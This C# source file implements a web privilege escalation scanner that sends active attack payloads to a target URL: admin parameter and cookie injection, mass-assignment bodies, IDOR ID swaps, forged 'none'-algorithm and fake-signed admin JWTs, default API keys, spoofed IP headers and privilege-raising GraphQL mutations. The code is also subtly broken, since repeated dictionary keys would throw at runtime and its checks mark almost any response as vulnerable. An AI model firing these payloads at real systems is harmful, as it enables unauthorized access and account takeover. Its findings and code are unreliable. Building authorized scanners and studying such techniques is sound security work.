using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using WebTrafficInspector.Models;

namespace WebTrafficInspector.Services
{
    /// <summary>
    /// Advanced privilege escalation vulnerability scanner using techniques from real-world exploits
    /// </summary>
    public class PrivilegeEscalationScannerService
    {
        private HttpClient _httpClient;
        private AuthBypassScannerService _authScanner;
        private Dictionary<string, UserContext> _userContexts;

        public PrivilegeEscalationScannerService()
        {
            _httpClient = new HttpClient();
            _httpClient.Timeout = TimeSpan.FromSeconds(30);
            _authScanner = new AuthBypassScannerService();
            _userContexts = new Dictionary<string, UserContext>();
        }

        public async Task<PrivEscScanReport> ScanForPrivilegeEscalation(string url, PrivEscOptions options = null)
        {
            options ??= new PrivEscOptions();

            var report = new PrivEscScanReport
            {
                Url = url,
                StartTime = DateTime.Now,
                Vulnerabilities = new List<PrivEscVulnerability>(),
                TestResults = new List<PrivEscTestResult>()
            };

            try
            {
                // Run all privilege escalation techniques
                var techniques = new List<Func<string, PrivEscOptions, Task<List<PrivEscVulnerability>>>>
                {
                    TestParameterManipulation,
                    TestIDORPrivilegeEscalation,
                    TestMassAssignment,
                    TestRoleManipulation,
                    TestHorizontalPrivilegeEscalation,
                    TestVerticalPrivilegeEscalation,
                    TestAPIKeyPrivilegeEscalation,
                    TestJWTRoleManipulation,
                    TestCookiePrivilegeEscalation,
                    TestHeaderManipulation,
                    TestGraphQLPrivilegeEscalation,
                    TestWebSocketPrivilegeEscalation,
                    TestRateLimitBypass,
                    TestAccountTakeover
                };

                foreach (var technique in techniques)
                {
                    var vulns = await technique(url, options);
                    report.Vulnerabilities.AddRange(vulns);
                }

                report.EndTime = DateTime.Now;
                report.Duration = (report.EndTime - report.StartTime).TotalSeconds;
                report.VulnerabilitiesFound = report.Vulnerabilities.Count;
                report.Status = report.VulnerabilitiesFound > 0 ? "Vulnerable" : "Secure";
            }
            catch (Exception ex)
            {
                report.Error = ex.Message;
                report.Status = "Error";
            }

            return report;
        }

        private async Task<List<PrivEscVulnerability>> TestParameterManipulation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Common privilege escalation parameters
            var escalationTests = new Dictionary<string, string>
            {
                { "admin", "true" },
                { "admin", "1" },
                { "isAdmin", "true" },
                { "is_admin", "true" },
                { "role", "admin" },
                { "role", "administrator" },
                { "role", "superuser" },
                { "user_role", "admin" },
                { "privilege", "admin" },
                { "permission", "admin" },
                { "access_level", "admin" },
                { "type", "admin" },
                { "group", "admin" },
                { "level", "99" },
                { "rank", "admin" }
            };

            foreach (var test in escalationTests)
            {
                var testUrl = AddParameter(url, test.Key, test.Value);
                var result = await TestPrivilegeEscalation(testUrl, $"Parameter: {test.Key}={test.Value}");

                if (result.IsVulnerable)
                {
                    vulnerabilities.Add(new PrivEscVulnerability
                    {
                        Type = "Parameter Manipulation",
                        Technique = "Direct Parameter Injection",
                        Description = $"Successfully escalated privileges by adding {test.Key}={test.Value}",
                        Severity = "Critical",
                        Request = testUrl,
                        Response = result.Response,
                        Evidence = result.Evidence,
                        CWE = "CWE-639",
                        Recommendation = "Implement server-side authorization checks, never trust client-side parameters"
                    });
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestIDORPrivilegeEscalation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Extract user/object IDs from URL
            var ids = ExtractIDs(url);

            foreach (var idParam in ids)
            {
                // Test with admin/privileged user IDs
                var privilegedIds = new[] { "0", "1", "admin", "root", "administrator", "system" };

                foreach (var privId in privilegedIds)
                {
                    var testUrl = ReplaceParameterValue(url, idParam.Key, privId);
                    var result = await TestPrivilegeEscalation(testUrl, $"IDOR with ID: {privId}");

                    if (result.IsVulnerable)
                    {
                        vulnerabilities.Add(new PrivEscVulnerability
                        {
                            Type = "IDOR Privilege Escalation",
                            Technique = "Privileged ID Injection",
                            Description = $"Accessed privileged user data by changing {idParam.Key} to {privId}",
                            Severity = "Critical",
                            Request = testUrl,
                            Response = result.Response,
                            Evidence = result.Evidence,
                            CWE = "CWE-639",
                            Recommendation = "Implement proper authorization checks for all object access"
                        });
                    }
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestMassAssignment(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            if (url.Contains("user") || url.Contains("profile") || url.Contains("account"))
            {
                // Test mass assignment with privileged fields
                var massAssignmentPayloads = new[]
                {
                    "{\"admin\":true,\"role\":\"admin\"}",
                    "{\"isAdmin\":true,\"userRole\":\"administrator\"}",
                    "{\"permission\":\"admin\",\"access_level\":\"superuser\"}",
                    "{\"role\":\"admin\",\"privilege\":99}",
                    "admin=true&role=admin&permission=all"
                };

                foreach (var payload in massAssignmentPayloads)
                {
                    var result = await TestMassAssignmentPayload(url, payload);

                    if (result.IsVulnerable)
                    {
                        vulnerabilities.Add(new PrivEscVulnerability
                        {
                            Type = "Mass Assignment",
                            Technique = "Privileged Field Injection",
                            Description = "Successfully injected privileged fields via mass assignment",
                            Severity = "Critical",
                            Request = url,
                            Response = result.Response,
                            Evidence = result.Evidence,
                            CWE = "CWE-915",
                            Recommendation = "Use allowlisting for assignable fields, never allow direct field assignment"
                        });
                    }
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestRoleManipulation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Extract and manipulate role-related parameters
            var roleTests = new[]
            {
                ("role", "admin"),
                ("role", "administrator"),
                ("role", "superuser"),
                ("role[]", "admin"),
                ("roles", "[\"admin\",\"superuser\"]"),
                ("user_type", "admin"),
                ("account_type", "admin")
            };

            foreach (var (param, value) in roleTests)
            {
                var testUrl = AddParameter(url, param, value);
                var result = await TestPrivilegeEscalation(testUrl, $"Role manipulation: {param}={value}");

                if (result.IsVulnerable)
                {
                    vulnerabilities.Add(new PrivEscVulnerability
                    {
                        Type = "Role Manipulation",
                        Technique = "Direct Role Assignment",
                        Description = $"Successfully manipulated role to {value}",
                        Severity = "Critical",
                        Request = testUrl,
                        Response = result.Response,
                        Evidence = result.Evidence,
                        CWE = "CWE-269",
                        Recommendation = "Enforce role assignment through secure backend processes only"
                    });
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestHorizontalPrivilegeEscalation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Test accessing other users' resources
            var ids = ExtractIDs(url);

            foreach (var idParam in ids)
            {
                // Test with different user IDs
                var testIds = new[] { "1", "2", "3", "10", "100", "999" };

                foreach (var testId in testIds)
                {
                    if (testId == idParam.Value) continue; // Skip original ID

                    var testUrl = ReplaceParameterValue(url, idParam.Key, testId);
                    var result = await TestHorizontalAccess(testUrl, testId);

                    if (result.IsVulnerable)
                    {
                        vulnerabilities.Add(new PrivEscVulnerability
                        {
                            Type = "Horizontal Privilege Escalation",
                            Technique = "Unauthorized User Access",
                            Description = $"Accessed another user's data (ID: {testId})",
                            Severity = "High",
                            Request = testUrl,
                            Response = result.Response,
                            Evidence = result.Evidence,
                            CWE = "CWE-639",
                            Recommendation = "Verify user ownership before allowing access to resources"
                        });
                        break; // Found one, that's enough
                    }
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestVerticalPrivilegeEscalation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Test accessing admin/privileged endpoints
            var adminPaths = new[]
            {
                "/admin", "/administrator", "/superuser", "/root",
                "/api/admin", "/api/v1/admin", "/manage", "/dashboard/admin",
                "/backend", "/internal", "/system", "/control"
            };

            foreach (var path in adminPaths)
            {
                var testUrl = GetBaseUrl(url) + path;
                var result = await TestVerticalAccess(testUrl);

                if (result.IsVulnerable)
                {
                    vulnerabilities.Add(new PrivEscVulnerability
                    {
                        Type = "Vertical Privilege Escalation",
                        Technique = "Admin Endpoint Access",
                        Description = $"Accessed admin endpoint: {path}",
                        Severity = "Critical",
                        Request = testUrl,
                        Response = result.Response,
                        Evidence = result.Evidence,
                        CWE = "CWE-269",
                        Recommendation = "Implement proper authentication and authorization for admin endpoints"
                    });
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestAPIKeyPrivilegeEscalation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Test with common/default API keys
            var apiKeys = new[]
            {
                "admin", "administrator", "root", "test", "demo", "12345",
                "api_key_admin", "master_key", "super_secret_key"
            };

            foreach (var key in apiKeys)
            {
                var result = await TestWithAPIKey(url, key);

                if (result.IsVulnerable)
                {
                    vulnerabilities.Add(new PrivEscVulnerability
                    {
                        Type = "API Key Privilege Escalation",
                        Technique = "Default/Weak API Key",
                        Description = $"Gained elevated access with API key: {key}",
                        Severity = "Critical",
                        Request = url,
                        Response = result.Response,
                        Evidence = result.Evidence,
                        CWE = "CWE-798",
                        Recommendation = "Remove default API keys, use strong random keys, implement key rotation"
                    });
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestJWTRoleManipulation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Extract JWT tokens from previous requests
            var tokens = _authScanner.ExtractTokensFromResponse(url);

            foreach (var token in tokens.Where(t => t.Key.Contains("jwt")))
            {
                // Try to manipulate JWT claims
                var manipulatedTokens = GenerateManipulatedJWTs(token.Value);

                foreach (var manipulated in manipulatedTokens)
                {
                    var result = await TestWithJWT(url, manipulated.Token);

                    if (result.IsVulnerable)
                    {
                        vulnerabilities.Add(new PrivEscVulnerability
                        {
                            Type = "JWT Privilege Escalation",
                            Technique = manipulated.Technique,
                            Description = manipulated.Description,
                            Severity = "Critical",
                            Request = url,
                            Response = result.Response,
                            Evidence = result.Evidence,
                            CWE = "CWE-269",
                            Recommendation = "Properly validate JWT signatures, verify claims server-side"
                        });
                    }
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestCookiePrivilegeEscalation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Test cookie manipulation
            var cookieTests = new Dictionary<string, string>
            {
                { "admin", "true" },
                { "isAdmin", "1" },
                { "role", "admin" },
                { "privilege", "admin" },
                { "access_level", "99" }
            };

            foreach (var test in cookieTests)
            {
                var result = await TestWithCookie(url, test.Key, test.Value);

                if (result.IsVulnerable)
                {
                    vulnerabilities.Add(new PrivEscVulnerability
                    {
                        Type = "Cookie Privilege Escalation",
                        Technique = "Cookie Manipulation",
                        Description = $"Escalated privileges via cookie: {test.Key}={test.Value}",
                        Severity = "High",
                        Request = url,
                        Response = result.Response,
                        Evidence = result.Evidence,
                        CWE = "CWE-565",
                        Recommendation = "Never store authorization decisions in cookies, use server-side sessions"
                    });
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestHeaderManipulation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Test privilege escalation via headers
            var headerTests = new Dictionary<string, string>
            {
                { "X-Admin", "true" },
                { "X-User-Role", "admin" },
                { "X-Privilege", "admin" },
                { "X-Access-Level", "admin" },
                { "X-Auth-Role", "administrator" },
                { "X-Custom-Role", "admin" }
            };

            foreach (var test in headerTests)
            {
                var result = await TestWithHeader(url, test.Key, test.Value);

                if (result.IsVulnerable)
                {
                    vulnerabilities.Add(new PrivEscVulnerability
                    {
                        Type = "Header Privilege Escalation",
                        Technique = "Custom Header Injection",
                        Description = $"Escalated privileges via header: {test.Key}: {test.Value}",
                        Severity = "Critical",
                        Request = url,
                        Response = result.Response,
                        Evidence = result.Evidence,
                        CWE = "CWE-639",
                        Recommendation = "Never trust client-provided headers for authorization decisions"
                    });
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestGraphQLPrivilegeEscalation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            if (url.ToLower().Contains("graphql"))
            {
                // Test GraphQL mutation with privileged fields
                var mutations = new[]
                {
                    "mutation { updateUser(id: 1, role: \"admin\") { id role } }",
                    "mutation { updateProfile(admin: true) { id isAdmin } }",
                    "mutation { escalatePrivilege(userId: 1, newRole: \"admin\") { success } }"
                };

                foreach (var mutation in mutations)
                {
                    var result = await TestGraphQLMutation(url, mutation);

                    if (result.IsVulnerable)
                    {
                        vulnerabilities.Add(new PrivEscVulnerability
                        {
                            Type = "GraphQL Privilege Escalation",
                            Technique = "Mutation Privilege Injection",
                            Description = "Escalated privileges via GraphQL mutation",
                            Severity = "Critical",
                            Request = url,
                            Response = result.Response,
                            Evidence = result.Evidence,
                            CWE = "CWE-639",
                            Recommendation = "Implement field-level authorization in GraphQL resolvers"
                        });
                    }
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestWebSocketPrivilegeEscalation(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // This would need WebSocket support - placeholder for now
            // Real implementation would test WebSocket message manipulation

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestRateLimitBypass(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Test various rate limit bypass techniques
            var bypassHeaders = new Dictionary<string, string>
            {
                { "X-Forwarded-For", "127.0.0.1" },
                { "X-Real-IP", "10.0.0.1" },
                { "X-Originating-IP", "192.168.1.1" },
                { "X-Client-IP", "172.16.0.1" }
            };

            // Make multiple requests to trigger rate limit
            for (int i = 0; i < 5; i++)
            {
                await _httpClient.GetAsync(url);
            }

            // Try bypass
            foreach (var header in bypassHeaders)
            {
                var result = await TestWithHeader(url, header.Key, header.Value);

                if (result.IsVulnerable && !result.Response.Contains("rate limit"))
                {
                    vulnerabilities.Add(new PrivEscVulnerability
                    {
                        Type = "Rate Limit Bypass",
                        Technique = "IP Header Spoofing",
                        Description = $"Bypassed rate limiting via {header.Key} header",
                        Severity = "Medium",
                        Request = url,
                        Response = result.Response,
                        Evidence = result.Evidence,
                        CWE = "CWE-799",
                        Recommendation = "Implement rate limiting based on authenticated user, not IP address alone"
                    });
                }
            }

            return vulnerabilities;
        }

        private async Task<List<PrivEscVulnerability>> TestAccountTakeover(string url, PrivEscOptions options)
        {
            var vulnerabilities = new List<PrivEscVulnerability>();

            // Test account takeover vectors
            if (url.Contains("reset") || url.Contains("forgot") || url.Contains("verify"))
            {
                // Test token/code reuse
                var tokens = ExtractTokensFromUrl(url);

                foreach (var token in tokens)
                {
                    // Try reusing the token
                    var result = await TestTokenReuse(url, token);

                    if (result.IsVulnerable)
                    {
                        vulnerabilities.Add(new PrivEscVulnerability
                        {
                            Type = "Account Takeover",
                            Technique = "Token Reuse",
                            Description = "Password reset/verification token can be reused",
                            Severity = "Critical",
                            Request = url,
                            Response = result.Response,
                            Evidence = result.Evidence,
                            CWE = "CWE-640",
                            Recommendation = "Implement one-time use tokens with short expiration"
                        });
                    }
                }
            }

            return vulnerabilities;
        }

        // Helper methods
        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestPrivilegeEscalation(string url, string technique)
        {
            try
            {
                var response = await _httpClient.GetAsync(url);
                var body = await response.Content.ReadAsStringAsync();

                // Check for privilege escalation indicators
                var privilegeIndicators = new[]
                {
                    "admin", "administrator", "superuser", "root",
                    "privilege", "elevated", "dashboard",
                    "\"role\":\"admin\"", "\"isAdmin\":true", "\"admin\":true"
                };

                foreach (var indicator in privilegeIndicators)
                {
                    if (body.Contains(indicator, StringComparison.OrdinalIgnoreCase))
                    {
                        return (true, body, $"{technique} - Found indicator: {indicator}");
                    }
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestMassAssignmentPayload(string url, string payload)
        {
            try
            {
                var content = new StringContent(payload, Encoding.UTF8,
                    payload.StartsWith("{") ? "application/json" : "application/x-www-form-urlencoded");

                var response = await _httpClient.PostAsync(url, content);
                var body = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode && body.Contains("admin"))
                {
                    return (true, body, "Successfully assigned privileged fields");
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestHorizontalAccess(string url, string userId)
        {
            try
            {
                var response = await _httpClient.GetAsync(url);
                var body = await response.Content.ReadAsStringAsync();

                // Check if we successfully accessed different user's data
                if (response.IsSuccessStatusCode && body.Length > 100)
                {
                    return (true, body, $"Accessed user {userId}'s data");
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestVerticalAccess(string url)
        {
            try
            {
                var response = await _httpClient.GetAsync(url);
                var body = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode && body.Contains("admin"))
                {
                    return (true, body, "Accessed admin endpoint without proper authorization");
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestWithAPIKey(string url, string apiKey)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, url);
                request.Headers.Add("X-API-Key", apiKey);
                request.Headers.Add("Authorization", $"Bearer {apiKey}");

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode)
                {
                    return (true, body, $"API key '{apiKey}' granted access");
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestWithJWT(string url, string jwt)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, url);
                request.Headers.Add("Authorization", $"Bearer {jwt}");

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode && body.Contains("admin"))
                {
                    return (true, body, "Manipulated JWT granted elevated access");
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestWithCookie(string url, string name, string value)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, url);
                request.Headers.Add("Cookie", $"{name}={value}");

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode && body.Contains("admin"))
                {
                    return (true, body, $"Cookie {name}={value} granted elevated access");
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestWithHeader(string url, string headerName, string headerValue)
        {
            try
            {
                using var request = new HttpRequestMessage(HttpMethod.Get, url);
                request.Headers.Add(headerName, headerValue);

                var response = await _httpClient.SendAsync(request);
                var body = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode)
                {
                    return (true, body, $"Header {headerName}: {headerValue} granted access");
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestGraphQLMutation(string url, string mutation)
        {
            try
            {
                var payload = new { query = mutation };
                var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");

                var response = await _httpClient.PostAsync(url, content);
                var body = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode && !body.Contains("error"))
                {
                    return (true, body, "GraphQL mutation succeeded");
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private async Task<(bool IsVulnerable, string Response, string Evidence)> TestTokenReuse(string url, string token)
        {
            try
            {
                // Try to use the token twice
                await _httpClient.GetAsync(url);
                var response = await _httpClient.GetAsync(url);
                var body = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode)
                {
                    return (true, body, "Token successfully reused");
                }

                return (false, body, "");
            }
            catch
            {
                return (false, "", "");
            }
        }

        private List<ManipulatedJWT> GenerateManipulatedJWTs(string originalJWT)
        {
            var manipulated = new List<ManipulatedJWT>();

            // None algorithm
            manipulated.Add(new ManipulatedJWT
            {
                Token = CreateNoneAlgorithmJWT(),
                Technique = "None Algorithm JWT",
                Description = "JWT with 'none' algorithm"
            });

            // Role manipulation
            manipulated.Add(new ManipulatedJWT
            {
                Token = CreateAdminJWT(),
                Technique = "JWT Role Manipulation",
                Description = "JWT with admin role injected"
            });

            return manipulated;
        }

        private string CreateNoneAlgorithmJWT()
        {
            var header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
            var payload = "{\"sub\":\"admin\",\"admin\":true,\"role\":\"admin\"}";

            var headerEncoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(header))
                .TrimEnd('=').Replace('+', '-').Replace('/', '_');
            var payloadEncoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload))
                .TrimEnd('=').Replace('+', '-').Replace('/', '_');

            return $"{headerEncoded}.{payloadEncoded}.";
        }

        private string CreateAdminJWT()
        {
            var header = "{\"alg\":\"HS256\",\"typ\":\"JWT\"}";
            var payload = "{\"sub\":\"1\",\"admin\":true,\"role\":\"administrator\",\"privilege\":\"admin\"}";

            var headerEncoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(header))
                .TrimEnd('=').Replace('+', '-').Replace('/', '_');
            var payloadEncoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload))
                .TrimEnd('=').Replace('+', '-').Replace('/', '_');

            return $"{headerEncoded}.{payloadEncoded}.invalid_signature";
        }

        private Dictionary<string, string> ExtractIDs(string url)
        {
            var ids = new Dictionary<string, string>();

            try
            {
                var uri = new Uri(url);
                var query = uri.Query.TrimStart('?');

                foreach (var pair in query.Split('&'))
                {
                    var parts = pair.Split('=');
                    if (parts.Length == 2)
                    {
                        var name = parts[0].ToLower();
                        var value = parts[1];

                        if (name.Contains("id") || name.Contains("user") || name.Contains("uid"))
                        {
                            ids[parts[0]] = value;
                        }
                    }
                }
            }
            catch { }

            return ids;
        }

        private List<string> ExtractTokensFromUrl(string url)
        {
            var tokens = new List<string>();

            try
            {
                var matches = Regex.Matches(url, @"[?&](token|code|verify|reset)=([^&]+)");
                foreach (Match match in matches)
                {
                    tokens.Add(match.Groups[2].Value);
                }
            }
            catch { }

            return tokens;
        }

        private string AddParameter(string url, string param, string value)
        {
            var separator = url.Contains("?") ? "&" : "?";
            return $"{url}{separator}{param}={Uri.EscapeDataString(value)}";
        }

        private string ReplaceParameterValue(string url, string param, string newValue)
        {
            try
            {
                var pattern = $@"({Regex.Escape(param)}=)[^&]+";
                return Regex.Replace(url, pattern, $"$1{Uri.EscapeDataString(newValue)}");
            }
            catch
            {
                return url;
            }
        }

        private string GetBaseUrl(string url)
        {
            try
            {
                var uri = new Uri(url);
                return $"{uri.Scheme}://{uri.Host}";
            }
            catch
            {
                return url;
            }
        }

        public string GenerateReport(PrivEscScanReport report)
        {
            var sb = new StringBuilder();
            sb.AppendLine("═══════════════════════════════════════════════════════════");
            sb.AppendLine("     Privilege Escalation Vulnerability Report");
            sb.AppendLine("═══════════════════════════════════════════════════════════");
            sb.AppendLine($"URL: {report.Url}");
            sb.AppendLine($"Status: {report.Status}");
            sb.AppendLine($"Duration: {report.Duration:F2}s");
            sb.AppendLine($"Vulnerabilities Found: {report.VulnerabilitiesFound}");
            sb.AppendLine();

            if (report.Vulnerabilities.Any())
            {
                var grouped = report.Vulnerabilities.GroupBy(v => v.Severity);

                foreach (var group in new[] { "Critical", "High", "Medium", "Low" })
                {
                    var vulns = grouped.FirstOrDefault(g => g.Key == group);
                    if (vulns != null && vulns.Any())
                    {
                        sb.AppendLine($"{group.ToUpper()} ({vulns.Count()}):");
                        sb.AppendLine(new string('-', 60));

                        foreach (var vuln in vulns)
                        {
                            sb.AppendLine($"  [{vuln.Type}]");
                            sb.AppendLine($"  Technique: {vuln.Technique}");
                            sb.AppendLine($"  {vuln.Description}");
                            sb.AppendLine($"  CWE: {vuln.CWE}");
                            sb.AppendLine($"  Recommendation: {vuln.Recommendation}");
                            sb.AppendLine($"  Evidence: {vuln.Evidence}");
                            sb.AppendLine();
                        }
                    }
                }
            }
            else
            {
                sb.AppendLine("No privilege escalation vulnerabilities detected.");
            }

            sb.AppendLine("═══════════════════════════════════════════════════════════");

            return sb.ToString();
        }
    }

    #region Models

    public class PrivEscOptions
    {
        public int DelayBetweenRequests { get; set; } = 100;
        public bool TestActiveExploits { get; set; } = true;
    }

    public class PrivEscScanReport
    {
        public string Url { get; set; }
        public DateTime StartTime { get; set; }
        public DateTime EndTime { get; set; }
        public double Duration { get; set; }
        public int VulnerabilitiesFound { get; set; }
        public string Status { get; set; }
        public List<PrivEscVulnerability> Vulnerabilities { get; set; }
        public List<PrivEscTestResult> TestResults { get; set; }
        public string Error { get; set; }
    }

    public class PrivEscVulnerability
    {
        public string Type { get; set; }
        public string Technique { get; set; }
        public string Description { get; set; }
        public string Severity { get; set; }
        public string Request { get; set; }
        public string Response { get; set; }
        public string Evidence { get; set; }
        public string CWE { get; set; }
        public string Recommendation { get; set; }
    }

    public class PrivEscTestResult
    {
        public string TestName { get; set; }
        public bool IsVulnerable { get; set; }
        public string Details { get; set; }
    }

    public class UserContext
    {
        public string UserId { get; set; }
        public string Role { get; set; }
        public string Token { get; set; }
        public Dictionary<string, string> Cookies { get; set; }
    }

    public class ManipulatedJWT
    {
        public string Token { get; set; }
        public string Technique { get; set; }
        public string Description { get; set; }
    }

    #endregion
}
